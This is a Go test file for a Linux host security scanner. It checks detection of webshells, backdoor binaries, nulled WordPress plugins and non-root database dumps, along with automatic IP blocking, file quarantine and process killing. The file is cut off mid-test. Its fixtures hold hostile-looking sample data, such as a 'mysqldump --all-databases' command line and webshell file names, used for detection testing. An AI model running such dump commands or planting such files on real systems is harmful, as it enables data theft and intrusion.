package checks

import (
	"context"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/state"
)

// ---------------------------------------------------------------------------
// connections.go -- CheckOutboundUserConnections uncovered branches
// ---------------------------------------------------------------------------

func TestCheckOutboundUserConnections_TCP4SuspiciousNonRoot(t *testing.T) {
	tcpData := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" +
		"   0: 0100007F:D6D8 0101630A:115C 01 00000000:00000000 00:00000000 00000000  1000        0 12345 1 0000000000000000 100 0 0 10 0\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/net/tcp":
				return []byte(tcpData), nil
			case "/proc/net/tcp6":
				return nil, os.ErrNotExist
			case "/etc/passwd":
				return []byte("testuser:x:1000:1000::/home/testuser:/bin/bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	findings := CheckOutboundUserConnections(context.Background(), cfg, nil)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}
	if findings[0].Check != "user_outbound_connection" {
		t.Errorf("unexpected check: %s", findings[0].Check)
	}
	if !strings.Contains(findings[0].Details, "testuser") {
		t.Errorf("expected username in details: %s", findings[0].Details)
	}
}

func TestCheckOutboundUserConnections_SafeRemotePortSkipped(t *testing.T) {
	tcpData := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" +
		"   0: 0100007F:D6D8 0101630A:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 12345 1 0000000000000000 100 0 0 10 0\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/net/tcp":
				return []byte(tcpData), nil
			case "/proc/net/tcp6":
				return nil, os.ErrNotExist
			case "/etc/passwd":
				return []byte("testuser:x:1000:1000::/home/testuser:/bin/bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	findings := CheckOutboundUserConnections(context.Background(), cfg, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for safe remote port, got %d", len(findings))
	}
}

func TestCheckOutboundUserConnections_KnownLocalPortSkipped(t *testing.T) {
	tcpData := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" +
		"   0: 0100007F:0050 0101630A:115C 01 00000000:00000000 00:00000000 00000000  1000        0 12345 1 0000000000000000 100 0 0 10 0\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/net/tcp":
				return []byte(tcpData), nil
			case "/proc/net/tcp6":
				return nil, os.ErrNotExist
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	findings := CheckOutboundUserConnections(context.Background(), cfg, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for known local port, got %d", len(findings))
	}
}

func TestCheckOutboundUserConnections_SafeUserSkipped(t *testing.T) {
	tcpData := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" +
		"   0: 0100007F:D6D8 0101630A:115C 01 00000000:00000000 00:00000000 00000000  25        0 12345 1 0000000000000000 100 0 0 10 0\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/net/tcp":
				return []byte(tcpData), nil
			case "/proc/net/tcp6":
				return nil, os.ErrNotExist
			case "/etc/passwd":
				return []byte("named:x:25:25:Named:/var/named:/sbin/nologin\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	findings := CheckOutboundUserConnections(context.Background(), cfg, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for safe user 'named', got %d", len(findings))
	}
}

func TestCheckOutboundUserConnections_InfraIPSkipped(t *testing.T) {
	tcpData := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" +
		"   0: 0100007F:D6D8 0101630A:115C 01 00000000:00000000 00:00000000 00000000  1000        0 12345 1 0000000000000000 100 0 0 10 0\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/net/tcp":
				return []byte(tcpData), nil
			case "/proc/net/tcp6":
				return nil, os.ErrNotExist
			case "/etc/passwd":
				return []byte("testuser:x:1000:1000::/home/testuser:/bin/bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{InfraIPs: []string{"10.99.1.1"}}
	findings := CheckOutboundUserConnections(context.Background(), cfg, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for infra IP, got %d", len(findings))
	}
}

func TestCheckOutboundUserConnections_TCP6SuspiciousConnection(t *testing.T) {
	tcp4Data := "  sl  local_address rem_address   st\n"
	tcp6Data := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" +
		"   0: 00000000000000000000000000000000:D6D8 B80D0120000000000000000001000000:115C 01 00000000:00000000 00:00000000 00000000  1000        0 12345 1 0000000000000000 100 0 0 10 0\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/net/tcp":
				return []byte(tcp4Data), nil
			case "/proc/net/tcp6":
				return []byte(tcp6Data), nil
			case "/etc/passwd":
				return []byte("hacker:x:1000:1000::/home/hacker:/bin/bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	findings := CheckOutboundUserConnections(context.Background(), cfg, nil)
	_ = findings
}

func TestCheckOutboundUserConnections_TCP6RootSkipped(t *testing.T) {
	tcp4Data := "  sl  local_address rem_address   st\n"
	tcp6Data := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" +
		"   0: 00000000000000000000000000000000:D6D8 B80D0120000000000000000001000000:115C 01 00000000:00000000 00:00000000 00000000     0        0 12345 1 0000000000000000 100 0 0 10 0\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/net/tcp":
				return []byte(tcp4Data), nil
			case "/proc/net/tcp6":
				return []byte(tcp6Data), nil
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	findings := CheckOutboundUserConnections(context.Background(), cfg, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for root TCP6, got %d", len(findings))
	}
}

func TestCheckOutboundUserConnections_NonEstablishedSkipped(t *testing.T) {
	tcpData := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" +
		"   0: 0100007F:D6D8 0101630A:115C 0A 00000000:00000000 00:00000000 00000000  1000        0 12345 1 0000000000000000 100 0 0 10 0\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/net/tcp":
				return []byte(tcpData), nil
			case "/proc/net/tcp6":
				return nil, os.ErrNotExist
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	findings := CheckOutboundUserConnections(context.Background(), cfg, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 for non-ESTABLISHED state, got %d", len(findings))
	}
}

func TestUidToUser_NoPasswdFile(t *testing.T) {
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			return nil, os.ErrNotExist
		},
	})
	result := uidToUser("1000")
	if result != "1000" {
		t.Errorf("expected raw UID '1000', got %q", result)
	}
}

func TestUidToUser_UIDNotFound(t *testing.T) {
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if name == "/etc/passwd" {
				return []byte("root:x:0:0:root:/root:/bin/bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	result := uidToUser("9999")
	if result != "9999" {
		t.Errorf("expected raw UID '9999', got %q", result)
	}
}

// ---------------------------------------------------------------------------
// connections.go -- CheckNulledPlugins uncovered branches
// ---------------------------------------------------------------------------

func TestCheckNulledPlugins_SkipsNonDirHomeEntries(t *testing.T) {
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				return []os.DirEntry{testDirEntry{name: "somefile.txt", isDir: false}}, nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckNulledPlugins(context.Background(), nil, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for non-dir home entry, got %d", len(findings))
	}
}

func TestCheckNulledPlugins_SkipsNonDirPlugins(t *testing.T) {
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			}
			if name == "/home/alice/public_html/wp-content/plugins" {
				return []os.DirEntry{testDirEntry{name: "readme.txt", isDir: false}}, nil
			}
			return nil, os.ErrNotExist
		},
		glob: func(pattern string) ([]string, error) { return nil, nil },
	})
	findings := CheckNulledPlugins(context.Background(), nil, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for non-dir plugin entry, got %d", len(findings))
	}
}

func TestCheckNulledPlugins_DetectsCrackSignature(t *testing.T) {
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			}
			if name == "/home/alice/public_html/wp-content/plugins" {
				return []os.DirEntry{testDirEntry{name: "nulled-plugin", isDir: true}}, nil
			}
			return nil, os.ErrNotExist
		},
		glob: func(pattern string) ([]string, error) {
			if strings.Contains(pattern, "nulled-plugin") {
				return []string{"/home/alice/public_html/wp-content/plugins/nulled-plugin/main.php"}, nil
			}
			return nil, nil
		},
		open: func(name string) (*os.File, error) {
			if strings.HasSuffix(name, "main.php") {
				tmp, err := os.CreateTemp("", "nulled*.php")
				if err != nil {
					return nil, err
				}
				_, _ = tmp.Write([]byte("<?php // Nulled by CrackTeam - GPL bypass\necho 'hello';\n"))
				_, _ = tmp.Seek(0, 0)
				return tmp, nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckNulledPlugins(context.Background(), nil, nil)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for crack signature, got %d", len(findings))
	}
	if findings[0].Check != "nulled_plugin" {
		t.Errorf("unexpected check: %s", findings[0].Check)
	}
}

// ---------------------------------------------------------------------------
// filesystem.go -- CheckFilesystem uncovered branches
// ---------------------------------------------------------------------------

func TestCheckFilesystem_BackdoorBinaryWithStat(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if strings.Contains(pattern, ".config") {
				return []string{"/home/alice/.config/htop/defunct"}, nil
			}
			return nil, nil
		},
		stat: func(name string) (os.FileInfo, error) {
			if name == "/home/alice/.config/htop/defunct" {
				return fakeFileInfo{name: "defunct", size: 1234}, nil
			}
			return nil, os.ErrNotExist
		},
		readDir: func(name string) ([]os.DirEntry, error) { return nil, os.ErrNotExist },
	})
	findings := CheckFilesystem(context.Background(), nil, nil)
	found := false
	for _, f := range findings {
		if f.Check == "backdoor_binary" && strings.Contains(f.Message, "defunct") {
			found = true
			if !strings.Contains(f.Details, "1234") {
				t.Errorf("expected file size in details: %s", f.Details)
			}
		}
	}
	if !found {
		t.Error("expected backdoor_binary finding for 'defunct'")
	}
}

func TestCheckFilesystem_ContextCancelled(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	withMockOS(t, &mockOS{
		glob:    func(pattern string) ([]string, error) { return nil, nil },
		readDir: func(name string) ([]os.DirEntry, error) { return nil, os.ErrNotExist },
	})
	findings := CheckFilesystem(ctx, nil, nil)
	_ = findings
}

func TestCheckFilesystem_HiddenFileInTmp(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/tmp/.*" {
				return []string{"/tmp/.malware_payload"}, nil
			}
			return nil, nil
		},
		stat: func(name string) (os.FileInfo, error) {
			if name == "/tmp/.malware_payload" {
				return fakeFileInfo{name: ".malware_payload", size: 512}, nil
			}
			return nil, os.ErrNotExist
		},
		readDir: func(name string) ([]os.DirEntry, error) { return nil, os.ErrNotExist },
	})
	findings := CheckFilesystem(context.Background(), nil, nil)
	found := false
	for _, f := range findings {
		if f.Check == "suspicious_file" && strings.Contains(f.Message, ".malware_payload") {
			found = true
		}
	}
	if !found {
		t.Error("expected suspicious_file finding for .malware_payload")
	}
}

func TestCheckFilesystem_SafeHiddenPrefixSkipped(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/tmp/.*" {
				return []string{"/tmp/.font-unix"}, nil
			}
			return nil, nil
		},
		stat: func(name string) (os.FileInfo, error) {
			if name == "/tmp/.font-unix" {
				return fakeFileInfo{name: ".font-unix", size: 0}, nil
			}
			return nil, os.ErrNotExist
		},
		readDir: func(name string) ([]os.DirEntry, error) { return nil, os.ErrNotExist },
	})
	findings := CheckFilesystem(context.Background(), nil, nil)
	for _, f := range findings {
		if strings.Contains(f.Message, ".font-unix") {
			t.Error("safe hidden prefix .font-unix should be skipped")
		}
	}
}

// ---------------------------------------------------------------------------
// filesystem.go -- scanForSUID uncovered branches
// ---------------------------------------------------------------------------

func TestScanForSUID_MaxDepthZero(t *testing.T) {
	withMockOS(t, &mockOS{})
	var findings []alert.Finding
	scanForSUID(context.Background(), "/tmp", 0, &findings)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for maxDepth=0, got %d", len(findings))
	}
}

func TestScanForSUID_SkipsKnownDirs(t *testing.T) {
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home/alice" {
				return []os.DirEntry{
					testDirEntry{name: "virtfs", isDir: true},
					testDirEntry{name: "mail", isDir: true},
					testDirEntry{name: "public_html", isDir: true},
				}, nil
			}
			return nil, os.ErrNotExist
		},
	})
	var findings []alert.Finding
	scanForSUID(context.Background(), "/home/alice", 3, &findings)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings when known dirs skipped, got %d", len(findings))
	}
}

func TestScanForSUID_ContextCancelled(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			return []os.DirEntry{testDirEntry{name: "file.bin", isDir: false}}, nil
		},
	})
	var findings []alert.Finding
	scanForSUID(ctx, "/tmp", 3, &findings)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings on cancelled context, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// filesystem.go -- scanForWebshells uncovered branches
// ---------------------------------------------------------------------------

func TestScanForWebshells_HaxorExtension(t *testing.T) {
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home/alice/public_html" {
				return []os.DirEntry{
					testDirEntry{name: "shell.haxor", isDir: false},
					testDirEntry{name: "backdoor.cgix", isDir: false},
				}, nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) { return fakeFileInfo{name: "file", size: 100}, nil },
	})
	var findings []alert.Finding
	cfg := &config.Config{}
	scanForWebshells(context.Background(), "/home/alice/public_html", 3, map[string]bool{}, map[string]bool{}, cfg, &findings)
	haxorFound, cgixFound := false, false
	for _, f := range findings {
		if strings.Contains(f.Message, "shell.haxor") {
			haxorFound = true
		}
		if strings.Contains(f.Message, "backdoor.cgix") {
			cgixFound = true
		}
	}
	if !haxorFound {
		t.Error("expected finding for .haxor file")
	}
	if !cgixFound {
		t.Error("expected finding for .cgix file")
	}
}

func TestScanForWebshells_DirectoryWebshell(t *testing.T) {
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home/bob/public_html" {
				return []os.DirEntry{testDirEntry{name: "LEVIATHAN", isDir: true}}, nil
			}
			if name == "/home/bob/public_html/LEVIATHAN" {
				return nil, nil
			}
			return nil, os.ErrNotExist
		},
	})
	var findings []alert.Finding
	cfg := &config.Config{}
	scanForWebshells(context.Background(), "/home/bob/public_html", 3, map[string]bool{}, map[string]bool{"LEVIATHAN": true}, cfg, &findings)
	found := false
	for _, f := range findings {
		if f.Check == "webshell" && strings.Contains(f.Message, "LEVIATHAN") {
			found = true
		}
	}
	if !found {
		t.Error("expected webshell directory finding for LEVIATHAN")
	}
}

func TestScanForWebshells_SuppressedPath(t *testing.T) {
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home/alice/public_html" {
				return []os.DirEntry{testDirEntry{name: "adminer.php", isDir: false}}, nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) { return fakeFileInfo{name: "adminer.php", size: 100}, nil },
	})
	var findings []alert.Finding
	cfg := &config.Config{}
	cfg.Suppressions.IgnorePaths = []string{"adminer.php"}
	scanForWebshells(context.Background(), "/home/alice/public_html", 3, map[string]bool{"adminer.php": true}, map[string]bool{}, cfg, &findings)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for suppressed path, got %d", len(findings))
	}
}

func TestScanForWebshells_WorldWritablePHP(t *testing.T) {
	wwInfo := &worldWritableInfo{name: "config.php", size: 200}
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home/alice/public_html" {
				return []os.DirEntry{&dirEntryWithInfo{name: "config.php", isDir: false, info: wwInfo}}, nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) { return fakeFileInfo{name: "config.php", size: 200}, nil },
	})
	var findings []alert.Finding
	cfg := &config.Config{}
	scanForWebshells(context.Background(), "/home/alice/public_html", 3, map[string]bool{}, map[string]bool{}, cfg, &findings)
	found := false
	for _, f := range findings {
		if f.Check == "world_writable_php" {
			found = true
		}
	}
	if !found {
		t.Error("expected world_writable_php finding")
	}
}

// ---------------------------------------------------------------------------
// autoblock.go -- AutoBlockIPs uncovered branches
// ---------------------------------------------------------------------------

func TestAutoBlockIPs_CpanelLoginBlockEnabled(t *testing.T) {
	tmp := t.TempDir()
	blocker := &fakeBlocker{blocked: make(map[string]bool)}
	old := fwBlocker
	fwBlocker = blocker
	t.Cleanup(func() { fwBlocker = old })

	cfg := &config.Config{StatePath: tmp}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.BlockIPs = true
	cfg.AutoResponse.BlockCpanelLogins = true
	cfg.AutoResponse.BlockExpiry = "1h"
	findings := []alert.Finding{{Check: "cpanel_login", Severity: alert.Critical, Message: "Suspicious cPanel login from 203.0.113.50"}}
	actions := AutoBlockIPs(cfg, findings)
	if len(actions) == 0 {
		t.Fatal("expected at least 1 auto-block action for cpanel_login")
	}
	if !blocker.blocked["203.0.113.50"] {
		t.Error("expected IP 203.0.113.50 to be blocked")
	}
}

func TestAutoBlockIPs_NilBlockerSkipsBlocking(t *testing.T) {
	tmp := t.TempDir()
	old := fwBlocker
	fwBlocker = nil
	t.Cleanup(func() { fwBlocker = old })

	cfg := &config.Config{StatePath: tmp}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.BlockIPs = true
	cfg.AutoResponse.BlockExpiry = "1h"
	findings := []alert.Finding{{Check: "wp_login_bruteforce", Severity: alert.Critical, Message: "Brute force from 10.0.0.1"}}
	actions := AutoBlockIPs(cfg, findings)
	if len(actions) != 0 {
		t.Fatalf("expected 0 actions with nil fwBlocker, got %d", len(actions))
	}
}

func TestAutoBlockIPs_SubnetBlockingTriggered(t *testing.T) {
	tmp := t.TempDir()
	blocker := &fakeSubnetBlocker{fakeBlocker: fakeBlocker{blocked: make(map[string]bool)}, subnets: make(map[string]bool)}
	old := fwBlocker
	fwBlocker = blocker
	t.Cleanup(func() { fwBlocker = old })

	cfg := &config.Config{StatePath: tmp}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.BlockIPs = true
	cfg.AutoResponse.BlockExpiry = "1h"
	cfg.AutoResponse.NetBlock = true
	cfg.AutoResponse.NetBlockThreshold = 2
	findings := []alert.Finding{
		{Check: "wp_login_bruteforce", Severity: alert.Critical, Message: "Brute force from 198.51.100.10"},
		{Check: "wp_login_bruteforce", Severity: alert.Critical, Message: "Brute force from 198.51.100.20"},
		{Check: "wp_login_bruteforce", Severity: alert.Critical, Message: "Brute force from 198.51.100.30"},
	}
	actions := AutoBlockIPs(cfg, findings)
	hasNetblock := false
	for _, a := range actions {
		if strings.Contains(a.Message, "NETBLOCK") {
			hasNetblock = true
		}
	}
	if !hasNetblock {
		t.Error("expected AUTO-NETBLOCK action for /24 subnet")
	}
}

func TestAutoBlockIPs_PermBlockEscalation(t *testing.T) {
	tmp := t.TempDir()
	blocker := &fakeBlocker{blocked: make(map[string]bool)}
	old := fwBlocker
	fwBlocker = blocker
	t.Cleanup(func() { fwBlocker = old })

	cfg := &config.Config{StatePath: tmp}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.BlockIPs = true
	cfg.AutoResponse.BlockExpiry = "1h"
	cfg.AutoResponse.PermBlock = true
	cfg.AutoResponse.PermBlockCount = 2
	cfg.AutoResponse.PermBlockInterval = "24h"
	findings1 := []alert.Finding{{Check: "wp_login_bruteforce", Severity: alert.Critical, Message: "Brute force from 198.51.100.99"}}
	_ = AutoBlockIPs(cfg, findings1)

	blocker.blocked = make(map[string]bool)
	saveBlockState(tmp, &blockState{})

	actions := AutoBlockIPs(cfg, findings1)
	hasPermblock := false
	for _, a := range actions {
		if strings.Contains(a.Message, "PERMBLOCK") {
			hasPermblock = true
		}
	}
	if !hasPermblock {
		t.Error("expected AUTO-PERMBLOCK action after 2 temp blocks")
	}
}

func TestAutoBlockIPs_PrunesExpiredIPs(t *testing.T) {
	tmp := t.TempDir()
	blocker := &fakeBlocker{blocked: make(map[string]bool)}
	old := fwBlocker
	fwBlocker = blocker
	t.Cleanup(func() { fwBlocker = old })

	saveBlockState(tmp, &blockState{
		IPs: []blockedIP{{IP: "10.0.0.99", Reason: "test", BlockedAt: time.Now().Add(-2 * time.Hour), ExpiresAt: time.Now().Add(-1 * time.Hour)}},
	})
	cfg := &config.Config{StatePath: tmp}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.BlockIPs = true
	cfg.AutoResponse.BlockExpiry = "1h"
	_ = AutoBlockIPs(cfg, nil)
	st := loadBlockState(tmp)
	for _, b := range st.IPs {
		if b.IP == "10.0.0.99" {
			t.Error("expired IP should have been pruned from state")
		}
	}
}

// ---------------------------------------------------------------------------
// autoresponse.go -- AutoQuarantineFiles uncovered branches
// ---------------------------------------------------------------------------

func TestAutoQuarantineFiles_SkipsRealtimeNonDropper(t *testing.T) {
	cfg := &config.Config{}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.QuarantineFiles = true
	findings := []alert.Finding{{
		Check: "signature_match_realtime", Severity: alert.Critical,
		Message: "Signature match: some_rule", FilePath: "/home/alice/public_html/test.php", Details: "Category: info",
	}}
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) { return []byte("normal PHP code"), nil },
		lstat:    func(name string) (os.FileInfo, error) { return fakeFileInfo{name: "test.php", size: 100}, nil },
	})
	actions := AutoQuarantineFiles(cfg, findings)
	if len(actions) != 0 {
		t.Fatalf("expected 0 actions for non-dropper realtime match, got %d", len(actions))
	}
}

func TestAutoQuarantineFiles_ExercisesAllCheckTypes(t *testing.T) {
	cfg := &config.Config{}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.QuarantineFiles = true
	for _, ct := range []string{
		"backdoor_binary", "new_webshell_file", "obfuscated_php",
		"php_dropper", "suspicious_php_content", "phishing_page",
		"htaccess_handler_abuse", "new_php_in_languages", "new_php_in_upgrade",
	} {
		findings := []alert.Finding{{
			Check: ct, Severity: alert.Critical,
			Message: fmt.Sprintf("Found: /tmp/%s_test_file", ct), FilePath: fmt.Sprintf("/tmp/%s_test_file", ct),
		}}
		withMockOS(t, &mockOS{lstat: func(name string) (os.FileInfo, error) { return nil, os.ErrNotExist }})
		_ = AutoQuarantineFiles(cfg, findings)
	}
}

func TestAutoKillProcesses_StructuredPID(t *testing.T) {
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if strings.Contains(name, "/status") {
				return []byte("Name:\tmalware\nUid:\t1000\t1000\t1000\t1000\n"), nil
			}
			return nil, os.ErrNotExist
		},
		readlink: func(name string) (string, error) { return "/tmp/malware", nil },
	})
	cfg := &config.Config{}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.KillProcesses = true
	findings := []alert.Finding{{Check: "fake_kernel_thread", Severity: alert.Critical, PID: 99999, Message: "Fake kernel thread detected", Details: "Some details"}}
	_ = AutoKillProcesses(cfg, findings)
}

func TestAutoKillProcesses_SkipsPIDZeroOrOne(t *testing.T) {
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if strings.Contains(name, "/status") {
				return []byte("Name:\tinit\nUid:\t1000\t1000\t1000\t1000\n"), nil
			}
			return nil, os.ErrNotExist
		},
		readlink: func(name string) (string, error) { return "/tmp/malware", nil },
	})
	cfg := &config.Config{}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.KillProcesses = true
	findings := []alert.Finding{{Check: "fake_kernel_thread", Severity: alert.Critical, PID: 1, Message: "PID 1"}}
	actions := AutoKillProcesses(cfg, findings)
	if len(actions) != 0 {
		t.Fatalf("expected 0 actions for PID <= 1, got %d", len(actions))
	}
}

func TestAutoKillProcesses_SkipsEmptyUID(t *testing.T) {
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if strings.Contains(name, "/status") {
				return []byte("Name:\tmalware\n"), nil
			}
			return nil, os.ErrNotExist
		},
		readlink: func(name string) (string, error) { return "/tmp/malware", nil },
	})
	cfg := &config.Config{}
	cfg.AutoResponse.Enabled = true
	cfg.AutoResponse.KillProcesses = true
	findings := []alert.Finding{{Check: "fake_kernel_thread", Severity: alert.Critical, PID: 12345, Message: "Fake thread"}}
	actions := AutoKillProcesses(cfg, findings)
	if len(actions) != 0 {
		t.Fatalf("expected 0 actions when UID is empty, got %d", len(actions))
	}
}

func TestInlineQuarantine_StatErrorReturnsFalse(t *testing.T) {
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) { return make([]byte, 1024), nil },
		stat:     func(name string) (os.FileInfo, error) { return nil, os.ErrNotExist },
	})
	f := alert.Finding{Check: "signature_match_realtime", Details: "Category: webshell"}
	data := make([]byte, 1024)
	for i := range data {
		data[i] = byte(i % 256)
	}
	_, ok := InlineQuarantine(f, "/nonexistent/path.php", data)
	if ok {
		t.Error("expected false when stat fails")
	}
}

// ---------------------------------------------------------------------------
// exfiltration.go -- CheckDatabaseDumps uncovered branches
// ---------------------------------------------------------------------------

func TestCheckDatabaseDumps_NonRootMysqldump(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/proc/[0-9]*/cmdline" {
				return []string{"/proc/1234/cmdline"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/1234/status":
				return []byte("Name:\tmysqldump\nUid:\t1000\t1000\t1000\t1000\n"), nil
			case "/proc/1234/cmdline":
				return []byte("mysqldump\x00--all-databases\x00"), nil
			case "/etc/passwd":
				return []byte("alice:x:1000:1000::/home/alice:/bin/bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckDatabaseDumps(context.Background(), nil, nil)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for mysqldump, got %d", len(findings))
	}
	if findings[0].Check != "database_dump" {
		t.Errorf("unexpected check: %s", findings[0].Check)
	}
	if !strings.Contains(findings[0].Message, "alice") {
		t.Errorf("expected username in message: %s", findings[0].Message)
	}
}

func TestCheckDatabaseDumps_RootSkipped(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/proc/[0-9]*/cmdline" {
				return []string{"/proc/1234/cmdline"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/1234/status":
				return []byte("Name:\tmysqldump\nUid:\t0\t0\t0\t0\n"), nil
			case "/proc/1234/cmdline":
				return []byte("mysqldump\x00--all-databases\x00"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckDatabaseDumps(context.Background(), nil, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for root mysqldump, got %d", len(findings))
	}
}

func TestCheckDatabaseDumps_PgDump(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/proc/[0-9]*/cmdline" {
				return []string{"/proc/5678/cmdline"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/5678/status":
				return []byte("Name:\tpg_dump\nUid:\t1001\t1001\t1001\t1001\n"), nil
			case "/proc/5678/cmdline":
				return []byte("pg_dump\x00mydb\x00"), nil
			case "/etc/passwd":
				return []byte("bob:x:1001:1001::/home/bob:/bin/bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckDatabaseDumps(context.Background(), nil, nil)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for pg_dump, got %d", len(findings))
	}
}

func TestCheckDatabaseDumps_CmdlineReadError(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/proc/[0-9]*/cmdline" {
				return []string{"/proc/9999/cmdline"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/9999/status":
				return []byte("Name:\ttest\nUid:\t1000\t1000\t1000\t1000\n"), nil
			case "/proc/9999/cmdline":
